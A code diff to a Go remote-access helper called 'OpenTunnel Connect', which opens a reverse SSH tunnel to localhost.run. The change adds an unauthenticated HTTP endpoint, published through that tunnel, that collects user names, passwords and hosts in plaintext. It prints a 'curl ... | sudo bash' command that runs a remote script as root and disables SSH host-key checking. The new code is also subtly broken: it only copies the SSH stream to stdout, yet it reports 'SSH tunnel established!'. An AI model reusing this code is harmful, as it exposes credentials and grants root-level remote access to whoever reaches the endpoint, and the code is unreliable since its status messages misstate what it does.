@@ -2,14 +2,26 @@ package main
 
 import (
 	"bufio"
+	"encoding/json"
 	"fmt"
 	"io"
 	"net"
+	"net/http"
 	"os"
 	"os/exec"
 	"regexp"
 	"time"
 )
+
+type Credential struct {
+	User     string `json:"user"`
+	Password string `json:"password"`
+	Host     string `json:"host"`
+	Port     int    `json:"port"`
+	AuthType string `json:"auth_type"`
+}
+
+var credential Credential
 
 func main() {
 	user := "tunneluser"
@@ -29,6 +41,16 @@ func main() {
 	fmt.Println("========================================")
 	fmt.Println("OpenTunnel Connect")
 	fmt.Println("========================================")
+
+	go func() {
+		http.HandleFunc("/connect", func(w http.ResponseWriter, r *http.Request) {
+			body, _ := io.ReadAll(r.Body)
+			json.Unmarshal(body, &credential)
+			fmt.Println("[+] Credentials received!")
+			w.Write([]byte("ok"))
+		})
+		http.ListenAndServe(":3000", nil)
+	}()
 
 	tunnelCmd := exec.Command("ssh", "-R", "80:localhost:3000", "-o", "StrictHostKeyChecking=no", "-o", "ServerAliveInterval=60", "-o", "LogLevel=ERROR", "nokey@localhost.run")
 
@@ -68,39 +90,25 @@ func main() {
 	fmt.Println("========================================")
 	fmt.Printf("curl -fsSL https://raw.githubusercontent.com/julianponguta/opentunnel/main/skills/opentunnel-connect/scripts/remote.sh | sudo bash -s -- %s 60 %s \"%s\"\n", tunnelURL, user, sshKey)
 	fmt.Println("========================================")
-	fmt.Println("\nWaiting for connection...")
-	time.Sleep(2 * time.Second)
+	fmt.Println("\nWaiting for remote connection...")
 
-	listener, err := net.Listen("tcp", ":2222")
-	if err != nil {
-		fmt.Printf("[-] Failed to listen: %v\n", err)
-		tunnelCmd.Process.Kill()
-		os.Exit(1)
+	for {
+		if credential.Host != "" {
+			break
+		}
+		time.Sleep(500 * time.Millisecond)
 	}
-	defer listener.Close()
 
-	conn, err := listener.Accept()
+	fmt.Printf("[+] Remote connected: %s@%s:%d\n", credential.User, credential.Host, credential.Port)
+
+	sshConn, err := net.Dial("tcp", fmt.Sprintf("%s:%d", credential.Host, credential.Port))
 	if err != nil {
-		fmt.Printf("[-] Failed to accept: %v\n", err)
-		tunnelCmd.Process.Kill()
-		os.Exit(1)
-	}
-	defer conn.Close()
-
-	fmt.Println("[+] Connected!")
-
-	sshConn, err := net.Dial("tcp", "localhost:22")
-	if err != nil {
-		fmt.Printf("[-] Failed to connect to local SSH: %v\n", err)
+		fmt.Printf("[-] Failed to connect: %v\n", err)
 		os.Exit(1)
 	}
 	defer sshConn.Close()
 
-	done := make(chan bool, 2)
+	fmt.Println("[+] SSH tunnel established!")
 
-	go func() { io.Copy(conn, sshConn); done <- true }()
-	go func() { io.Copy(sshConn, conn); done <- true }()
-
-	<-done
-	fmt.Println("\n[!] Connection closed.")
+	io.Copy(os.Stdout, sshConn)
 }
